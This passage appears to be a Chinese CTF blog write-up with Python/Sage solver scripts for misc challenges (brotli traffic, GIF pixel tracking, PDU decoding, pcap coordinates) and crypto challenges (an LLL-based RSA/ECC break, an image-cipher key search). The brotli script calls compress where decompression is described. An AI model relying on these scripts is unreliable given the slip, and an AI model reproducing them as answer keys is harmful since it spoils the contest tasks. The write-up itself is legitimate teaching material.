    <content type="html"><![CDATA[<h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="tiny-traffic"><a href="#tiny-traffic" class="headerlink" title="tiny traffic"></a>tiny traffic</h3><p>拿到流量包审计流量发现两个可疑文件<code>test</code>和<code>secret</code>，查看服务器响应信息得知其使用<code>br</code>算法压缩，写个脚本解压缩</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> brotli</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'secret'</span>,<span class="string">'rb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    content = brotli.compress(f.read())</span><br><span class="line">    <span class="keyword">with</span> open(<span class="string">'secret123'</span>,<span class="string">'wb'</span>) <span class="keyword">as</span> o:</span><br><span class="line">        o.write(content)</span><br></pre></td></tr></table></figure><p><code>test</code>解压缩后得到<code>proto3</code>协议自定义规则。<br>python写个脚本用该规则读取<code>secret</code>中解压缩的数据得到flag，转一下格式即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> flag_pb2 <span class="keyword">as</span> flag</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read_test</span><span class="params">()</span>:</span></span><br><span class="line">    flag_msg = flag.PBResponse()</span><br><span class="line">    flag_msg_file = <span class="string">"./secret123"</span></span><br><span class="line"></span><br><span class="line">    f = open(flag_msg_file, <span class="string">"rb"</span>)</span><br><span class="line">    flag_msg.ParseFromString(f.read())</span><br><span class="line">    f.close()</span><br><span class="line"></span><br><span class="line">    print(flag_msg)</span><br></pre></td></tr></table></figure><h3 id="running-pixel"><a href="#running-pixel" class="headerlink" title="running_pixel"></a>running_pixel</h3><p>将<code>gif</code>文件分割后查看图片像素可以在<code>RGB</code>的低<code>3</code>位色道中看到一个突兀的小点，提取像素发现该值为(233,233,233)，且很多图片都有。<br>很明显该像素点的运动轨迹即为flag。运动轨迹提取脚本如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line">files = os.listdir(<span class="string">'./running_pixel.gif.ifl'</span>)</span><br><span class="line"></span><br><span class="line">img = Image.new(<span class="string">'RGB'</span>,(<span class="number">400</span>,<span class="number">400</span>),<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">num = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> file <span class="keyword">in</span> files:</span><br><span class="line">    tmp = Image.open(<span class="string">'./running_pixel.gif.ifl/'</span>+file)</span><br><span class="line">    flag = <span class="number">0</span> ; tmp_num = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">400</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">400</span>):</span><br><span class="line">            pixel = tmp.getpixel((j,i))</span><br><span class="line">            tmp_num += <span class="number">1</span></span><br><span class="line">            <span class="keyword">if</span> pixel == (<span class="number">233</span>,<span class="number">233</span>,<span class="number">233</span>):</span><br><span class="line">                img.putpixel((i,j),(<span class="number">255</span>,<span class="number">255</span>,<span class="number">255</span>))</span><br><span class="line">                flag = <span class="number">1</span></span><br><span class="line">                tmp_num = <span class="number">0</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> flag == <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> tmp_num == <span class="number">160000</span>:</span><br><span class="line">        num += <span class="number">1</span></span><br><span class="line">        img.save(<span class="string">'flag'</span>+str(num).zfill(<span class="number">2</span>)+<span class="string">'.png'</span>)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">400</span>):</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">400</span>):</span><br><span class="line">                img.putpixel((i,j),<span class="number">0</span>)</span><br></pre></td></tr></table></figure><h3 id="隔空喊话"><a href="#隔空喊话" class="headerlink" title="隔空喊话"></a>隔空喊话</h3><p>题目所给数据为<code>PDU</code>编码数据，工具解码即可看到关键提示。</p><p>查阅PDU编码格式资料发现第五行之后的数据时间顺序紊乱，脚本排序后再次解码可以得到宽高错误的<code>png</code>文件，提示<code>w465</code>，将宽度修改为465，高任意，然后打开即可看到flag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 时间戳排序脚本</span></span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'data.txt'</span>,<span class="string">'r'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">with</span> open(<span class="string">'data123.txt'</span>,<span class="string">'w'</span>) <span class="keyword">as</span> o:</span><br><span class="line">        tmp = []</span><br><span class="line">        <span class="keyword">for</span> line <span class="keyword">in</span> f.readlines():</span><br><span class="line">            <span class="comment">#36</span></span><br><span class="line">            tmp.append(line.strip())</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(len(tmp)<span class="number">-1</span>):</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> range(len(tmp)<span class="number">-1</span>):</span><br><span class="line">                tmp_data_1 = tmp[j]</span><br><span class="line">                tmp_data_2 = tmp[j+<span class="number">1</span>]</span><br><span class="line">                tmp_data_1 = tmp_data_1[<span class="number">42</span>:<span class="number">44</span>][::<span class="number">-1</span>]+tmp_data_1[<span class="number">44</span>:<span class="number">46</span>][::<span class="number">-1</span>]</span><br><span class="line">                tmp_data_2 = tmp_data_2[<span class="number">42</span>:<span class="number">44</span>][::<span class="number">-1</span>]+tmp_data_2[<span class="number">44</span>:<span class="number">46</span>][::<span class="number">-1</span>]</span><br><span class="line">                <span class="keyword">if</span> int(tmp_data_1[:<span class="number">2</span>]) * <span class="number">60</span> + int(tmp_data_1[<span class="number">2</span>:]) &gt; int(tmp_data_2[:<span class="number">2</span>]) * <span class="number">60</span> + int(tmp_data_2[<span class="number">2</span>:]):</span><br><span class="line">                    tmp_data = tmp[j+<span class="number">1</span>]</span><br><span class="line">                    tmp[j+<span class="number">1</span>] = tmp[j]</span><br><span class="line">                    tmp[j] = tmp_data</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> tmp:</span><br><span class="line">            o.write(i+<span class="string">'\n'</span>)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 解码后hex数据转文件</span></span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'data.back.txt'</span>,<span class="string">'r'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">with</span> open(<span class="string">'data_hex'</span>,<span class="string">'wb'</span>) <span class="keyword">as</span> o:</span><br><span class="line">        <span class="keyword">for</span> line <span class="keyword">in</span> f.readlines():</span><br><span class="line">            o.write(binascii.a2b_hex(line.strip()))</span><br></pre></td></tr></table></figure><h3 id="robot"><a href="#robot" class="headerlink" title="robot"></a>robot</h3><p>查看流量包可以发现流量包中存在明文坐标数据。脚本提取坐标画图直接出。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">with</span> open(<span class="string">'cap.pcapng'</span>,<span class="string">'rb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">with</span> open(<span class="string">'data.txt'</span>,<span class="string">'wb'</span>) <span class="keyword">as</span> o:</span><br><span class="line">        f.read(<span class="number">0x120</span>)</span><br><span class="line">        tmp = f.read(<span class="number">0x1c</span>)</span><br><span class="line">        <span class="keyword">while</span> tmp != <span class="string">b''</span>:</span><br><span class="line">            length = <span class="number">0</span></span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> f.read(<span class="number">4</span>)[::<span class="number">-1</span>]:</span><br><span class="line">                length = length * <span class="number">256</span> + i</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span> length &gt;= <span class="number">135</span> <span class="keyword">and</span> length &lt;= <span class="number">140</span>:</span><br><span class="line">                <span class="keyword">if</span> length % <span class="number">4</span> != <span class="number">0</span>:</span><br><span class="line">                    length += <span class="number">4</span> - length % <span class="number">4</span>    </span><br><span class="line">                o.write(bytes.fromhex(hex(length)[<span class="number">2</span>:]))</span><br><span class="line">                o.write(f.read(length))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">if</span> length % <span class="number">4</span> != <span class="number">0</span>:</span><br><span class="line">                    length += <span class="number">4</span> - length % <span class="number">4</span></span><br><span class="line">                f.read(length)</span><br><span class="line">            tmp = f.read(<span class="number">0x1c</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'data.txt'</span>,<span class="string">'rb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">with</span> open(<span class="string">'address.txt'</span>,<span class="string">'w'</span>) <span class="keyword">as</span> o:</span><br><span class="line">        length = f.read(<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">while</span> length != <span class="string">b''</span>:</span><br><span class="line">            data = f.read(length[<span class="number">0</span>])</span><br><span class="line">            </span><br><span class="line">            l_index = data.index(<span class="string">b'Value\x00['</span>)</span><br><span class="line">            l_index = data.index(<span class="string">b'['</span>,l_index)</span><br><span class="line">            r_index = data.index(<span class="string">b']'</span>,l_index)</span><br><span class="line">            data = data[l_index:r_index+<span class="number">1</span>]</span><br><span class="line">            data = data.decode()+<span class="string">'\n'</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">'-'</span> <span class="keyword">not</span> <span class="keyword">in</span> data:</span><br><span class="line">                o.write(data)</span><br><span class="line">            length = f.read(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line">img = Image.new(<span class="string">'L'</span>,(<span class="number">400</span>,<span class="number">200</span>))</span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'address.txt'</span>,<span class="string">'r'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> f.readlines():</span><br><span class="line">        line = eval(line.strip())</span><br><span class="line">        img.putpixel((line[<span class="number">0</span>],line[<span class="number">1</span>]),<span class="number">255</span>)</span><br><span class="line"></span><br><span class="line">img.show()</span><br></pre></td></tr></table></figure><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="Move"><a href="#Move" class="headerlink" title="Move"></a>Move</h3><p>和2021虎符的题挺像。<br>先造格子LLL，规约出x和y；再用二分法算出p+q；再解方程求出p和q；剩下就是ECC</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">n = <span class="number">80263253261445006152401958351371889864136455346002795891511487600252909606767728751977033280031100015044527491214958035106007038983560835618126173948587479951247946411421106848023637323702085026892674032294882180449860010755423988302942811352582243198025232225481839705626921264432951916313817802968185697281</span></span><br><span class="line">e = <span class="number">67595664083683668964629173652731210158790440033379175857028564313854014366016864587830963691802591775486321717360190604997584315420339351524880699113147436604350832401671422613906522464334532396034178284918058690365507263856479304019153987101884697932619200538492228093521576834081916538860988787322736613809</span></span><br><span class="line">h1 = <span class="number">3518005</span></span><br><span class="line">h2 = <span class="number">641975</span></span><br><span class="line">c = (<span class="number">6785035174838834841914183175930647480879288136014127270387869708755060512201304812721289604897359441373759673837533885681257952731178067761309151636485456082277426056629351492198510336245951408977207910307892423796711701271285060489337800033465030600312615976587155922834617686938658973507383512257481837605</span>,<span class="number">38233052047321946362283579951524857528047793820071079629483638995357740390030253046483152584725740787856777849310333417930989050087087487329435299064039690255526263003473139694460808679743076963542716855777569123353687450350073011620347635639646034793626760244748027610309830233139635078417444771674354527028</span>)</span><br><span class="line"></span><br><span class="line">hn = int(sqrt(n))</span><br><span class="line">M = matrix([[hn, e],</span><br><span class="line">            [<span class="number">0</span>, -n]])</span><br><span class="line">L = M.LLL()[<span class="number">0</span>]</span><br><span class="line"><span class="comment"># print (L)</span></span><br><span class="line"><span class="comment"># (-235436912945336662391026124471105219395770217328162018931594609419582745114251948238840212881814533708592325776478635076056630520429862826686225762483017735282225173655229129488512828712599656980161312082481987496707036067942329100, -406850608655407486298019095013146348847805975120061760929682791882948049742096195978800022454159691659865169100330308708576847735609146508679126419372034710027124703842712262177437006326228856546452636094881051757653949488135598409)</span></span><br><span class="line">mm = matrix(L)</span><br><span class="line"><span class="comment"># print ((-mm)/M)</span></span><br><span class="line">x, y = <span class="number">26279444166664821795077701675621823220865336004430428203703688888211697122228</span>, <span class="number">22131877391133483964429946329193825460775374851078084751208971056041193500203</span></span><br><span class="line">bound = int(sqrt(<span class="number">2</span> * n)) // <span class="number">12</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">find_p_puls_q</span><span class="params">(K, N)</span>:</span></span><br><span class="line">    l = <span class="number">0</span></span><br><span class="line">    r = K</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">515</span>):</span><br><span class="line">        s = (l + r) // <span class="number">2</span></span><br><span class="line">        v = s * s - int(<span class="number">9</span> * s ^ <span class="number">2</span> * (K - <span class="number">1</span> - s) * (K - <span class="number">1</span> - s)) // (round(N ^ <span class="number">0.25</span>) * round(N ^ <span class="number">0.25</span>))</span><br><span class="line">        <span class="keyword">if</span> v &lt; <span class="number">4</span> * N:</span><br><span class="line">            l = s</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            r = s</span><br><span class="line">    <span class="keyword">return</span> r</span><br><span class="line"></span><br><span class="line">k = e * x - y * n</span><br><span class="line">K = k // y</span><br><span class="line">s = find_p_puls_q(K, n)</span><br><span class="line"><span class="comment"># print(s)</span></span><br><span class="line"><span class="comment"># s=18383013852155207284866834850624501649134164688503883162216824258842790032992437383933186349369945088653252318167911285710266631681220716855493349532603970</span></span><br><span class="line">var(<span class="string">'p q'</span>)</span><br><span class="line">eq1 = p + q == s</span><br><span class="line">eq2 = p * q == n</span><br><span class="line">solve([eq1, eq2], p, q)</span><br><span class="line">p = <span class="number">7137110102022535123348664656689848983548191256934755709215236325084864398993149288243244941561397379979025441681860286823605147363784020425000696750337273</span></span><br><span class="line">q = <span class="number">11245903750132672161518170193934652665585973431569127453001587933757925633999288095689941407808547708674226876486050998886661484317436696430492652782266697</span></span><br><span class="line">a = <span class="number">0</span></span><br><span class="line">x, y = <span class="number">6785035174838834841914183175930647480879288136014127270387869708755060512201304812721289604897359441373759673837533885681257952731178067761309151636485456082277426056629351492198510336245951408977207910307892423796711701271285060489337800033465030600312615976587155922834617686938658973507383512257481837605</span>, <span class="number">38233052047321946362283579951524857528047793820071079629483638995357740390030253046483152584725740787856777849310333417930989050087087487329435299064039690255526263003473139694460808679743076963542716855777569123353687450350073011620347635639646034793626760244748027610309830233139635078417444771674354527028</span></span><br><span class="line"><span class="comment"># y^2==（x^3+b）%n</span></span><br><span class="line">b = (y ^ <span class="number">2</span> - x ^ <span class="number">3</span>) % n</span><br><span class="line"><span class="comment"># b=80263253261445006152401958351371889864136455346002795891511487600252909606767728751977033280031100015044527491214958035106007038983560835618126173948587479951247946411421103469394495274706241578726021598690355239783781433785479293793926265140251884444575671410967573946453503486277025286699273827984004452338</span></span><br><span class="line">phi = (p + <span class="number">1</span>) * (q + <span class="number">1</span>)</span><br><span class="line">d = inverse_mod(e, phi)</span><br><span class="line">E = EllipticCurve(GF(p), [a, b])</span><br><span class="line">C = E([x, y])</span><br><span class="line">G = d * C</span><br><span class="line">print(G)</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">print(long_to_bytes(<span class="number">1500537458076802315061673741609048809282155574</span>)+long_to_bytes(<span class="number">293348288331056197202496342835702240774641366909</span>))</span><br></pre></td></tr></table></figure><h3 id="Imageencrypt"><a href="#Imageencrypt" class="headerlink" title="Imageencrypt"></a>Imageencrypt</h3><p>用testimage爆破key，排列组合试一下推出ch，然后求seq，再求x，求r，再求x0</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> collections <span class="keyword">import</span> Counter</span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"><span class="keyword">import</span> md5</span><br><span class="line"></span><br><span class="line">testimage=[<span class="number">205</span>, <span class="number">237</span>, <span class="number">6</span>, <span class="number">158</span>, <span class="number">24</span>, <span class="number">119</span>, <span class="number">213</span>, <span class="number">32</span>, <span class="number">74</span>, <span class="number">151</span>, <span class="number">142</span>, <span class="number">186</span>, <span class="number">57</span>, <span class="number">28</span>, <span class="number">113</span>, <span class="number">62</span>, <span class="number">165</span>, <span class="number">20</span>, <span class="number">190</span>, <span class="number">37</span>, <span class="number">159</span>, <span class="number">137</span>, <span class="number">196</span>, <span class="number">44</span>, <span class="number">97</span>, <span class="number">37</span>, <span class="number">7</span>, <span class="number">222</span>, <span class="number">220</span>, <span class="number">95</span>, <span class="number">4</span>, <span class="number">66</span>, <span class="number">0</span>, <span class="number">28</span>, <span class="number">199</span>, <span class="number">142</span>, <span class="number">95</span>, <span class="number">105</span>, <span class="number">119</span>, <span class="number">232</span>, <span class="number">250</span>, <span class="number">215</span>, <span class="number">60</span>, <span class="number">162</span>, <span class="number">91</span>, <span class="number">211</span>, <span class="number">63</span>, <span class="number">30</span>, <span class="number">91</span>, <span class="number">108</span>, <span class="number">217</span>, <span class="number">206</span>, <span class="number">80</span>, <span class="number">193</span>, <span class="number">230</span>, <span class="number">42</span>, <span class="number">221</span>, <span class="number">71</span>, <span class="number">136</span>, <span class="number">115</span>, <span class="number">22</span>, <span class="number">176</span>, <span class="number">91</span>, <span class="number">57</span>, <span class="number">61</span>, <span class="number">3</span>, <span class="number">87</span>, <span class="number">73</span>, <span class="number">250</span>, <span class="number">121</span>, <span class="number">51</span>, <span class="number">72</span>, <span class="number">83</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">199</span>, <span class="number">236</span>, <span class="number">190</span>, <span class="number">249</span>, <span class="number">116</span>, <span class="number">45</span>, <span class="number">6</span>, <span class="number">134</span>, <span class="number">110</span>, <span class="number">149</span>, <span class="number">94</span>, <span class="number">214</span>, <span class="number">232</span>, <span class="number">153</span>, <span class="number">213</span>, <span class="number">119</span>, <span class="number">98</span>, <span class="number">81</span>, <span class="number">203</span>, <span class="number">240</span>, <span class="number">114</span>, <span class="number">240</span>, <span class="number">29</span>, <span class="number">122</span>, <span class="number">188</span>, <span class="number">156</span>, <span class="number">53</span>, <span class="number">128</span>, <span class="number">185</span>, <span class="number">40</span>, <span class="number">147</span>, <span class="number">245</span>, <span class="number">204</span>, <span class="number">47</span>, <span class="number">101</span>, <span class="number">80</span>, <span class="number">229</span>, <span class="number">41</span>, <span class="number">150</span>, <span class="number">28</span>, <span class="number">195</span>, <span class="number">25</span>, <span class="number">235</span>, <span class="number">119</span>, <span class="number">6</span>, <span class="number">192</span>, <span class="number">8</span>, <span class="number">73</span>, <span class="number">255</span>, <span class="number">159</span>, <span class="number">172</span>, <span class="number">77</span>, <span class="number">94</span>, <span class="number">254</span>, <span class="number">104</span>, <span class="number">236</span>, <span class="number">219</span>, <span class="number">141</span>, <span class="number">91</span>, <span class="number">195</span>, <span class="number">162</span>, <span class="number">97</span>, <span class="number">56</span>, <span class="number">252</span>, <span class="number">173</span>, <span class="number">163</span>, <span class="number">43</span>, <span class="number">167</span>, <span class="number">214</span>, <span class="number">50</span>, <span class="number">73</span>, <span class="number">115</span>, <span class="number">190</span>, <span class="number">254</span>, <span class="number">53</span>, <span class="number">61</span>, <span class="number">77</span>, <span class="number">138</span>, <span class="number">192</span>, <span class="number">15</span>, <span class="number">4</span>, <span class="number">190</span>, <span class="number">27</span>, <span class="number">37</span>, <span class="number">108</span>, <span class="number">101</span>, <span class="number">135</span>, <span class="number">90</span>, <span class="number">215</span>, <span class="number">106</span>, <span class="number">243</span>, <span class="number">112</span>, <span class="number">111</span>, <span class="number">106</span>, <span class="number">89</span>, <span class="number">143</span>, <span class="number">150</span>, <span class="number">185</span>, <span class="number">142</span>, <span class="number">192</span>, <span class="number">176</span>, <span class="number">48</span>, <span class="number">138</span>, <span class="number">164</span>, <span class="number">185</span>, <span class="number">61</span>, <span class="number">77</span>, <span class="number">72</span>, <span class="number">0</span>, <span class="number">17</span>, <span class="number">203</span>, <span class="number">210</span>, <span class="number">71</span>, <span class="number">186</span>, <span class="number">49</span>, <span class="number">162</span>, <span class="number">250</span>, <span class="number">218</span>, <span class="number">219</span>, <span class="number">195</span>, <span class="number">63</span>, <span class="number">248</span>, <span class="number">220</span>, <span class="number">155</span>, <span class="number">180</span>, <span class="number">219</span>, <span class="number">132</span>, <span class="number">219</span>, <span class="number">94</span>, <span class="number">144</span>, <span class="number">247</span>, <span class="number">211</span>, <span class="number">95</span>, <span class="number">70</span>, <span class="number">227</span>, <span class="number">222</span>, <span class="number">31</span>, <span class="number">69</span>, <span class="number">24</span>, <span class="number">13</span>, <span class="number">216</span>, <span class="number">185</span>, <span class="number">108</span>, <span class="number">137</span>, <span class="number">57</span>, <span class="number">186</span>, <span class="number">211</span>, <span class="number">55</span>, <span class="number">27</span>, <span class="number">158</span>, <span class="number">241</span>, <span class="number">223</span>, <span class="number">21</span>, <span class="number">134</span>, <span class="number">106</span>, <span class="number">152</span>, <span class="number">127</span>, <span class="number">187</span>, <span class="number">245</span>, <span class="number">246</span>, <span class="number">131</span>, <span class="number">176</span>, <span class="number">177</span>, <span class="number">228</span>, <span class="number">100</span>, <span class="number">112</span>, <span class="number">11</span>, <span class="number">84</span>, <span class="number">61</span>, <span class="number">193</span>, <span class="number">42</span>, <span class="number">41</span>, <span class="number">69</span>, <span class="number">229</span>, <span class="number">145</span>, <span class="number">254</span>, <span class="number">138</span>, <span class="number">3</span>, <span class="number">153</span>, <span class="number">123</span>, <span class="number">31</span>]</span><br><span class="line">enc_testimag=[<span class="number">131</span>, <span class="number">92</span>, <span class="number">72</span>, <span class="number">47</span>, <span class="number">177</span>, <span class="number">57</span>, <span class="number">131</span>, <span class="number">118</span>, <span class="number">4</span>, <span class="number">38</span>, <span class="number">192</span>, <span class="number">19</span>, <span class="number">119</span>, <span class="number">82</span>, <span class="number">63</span>, <span class="number">143</span>, <span class="number">235</span>, <span class="number">165</span>, <span class="number">15</span>, <span class="number">140</span>, <span class="number">209</span>, <span class="number">223</span>, <span class="number">117</span>, <span class="number">133</span>, <span class="number">47</span>, <span class="number">148</span>, <span class="number">81</span>, <span class="number">144</span>, <span class="number">138</span>, <span class="number">246</span>, <span class="number">173</span>, <span class="number">235</span>, <span class="number">177</span>, <span class="number">181</span>, <span class="number">110</span>, <span class="number">39</span>, <span class="number">9</span>, <span class="number">192</span>, <span class="number">57</span>, <span class="number">166</span>, <span class="number">180</span>, <span class="number">153</span>, <span class="number">141</span>, <span class="number">19</span>, <span class="number">234</span>, <span class="number">157</span>, <span class="number">142</span>, <span class="number">80</span>, <span class="number">234</span>, <span class="number">197</span>, <span class="number">151</span>, <span class="number">152</span>, <span class="number">249</span>, <span class="number">143</span>, <span class="number">176</span>, <span class="number">155</span>, <span class="number">147</span>, <span class="number">17</span>, <span class="number">57</span>, <span class="number">194</span>, <span class="number">191</span>, <span class="number">254</span>, <span class="number">13</span>, <span class="number">144</span>, <span class="number">140</span>, <span class="number">85</span>, <span class="number">25</span>, <span class="number">248</span>, <span class="number">172</span>, <span class="number">208</span>, <span class="number">154</span>, <span class="number">249</span>, <span 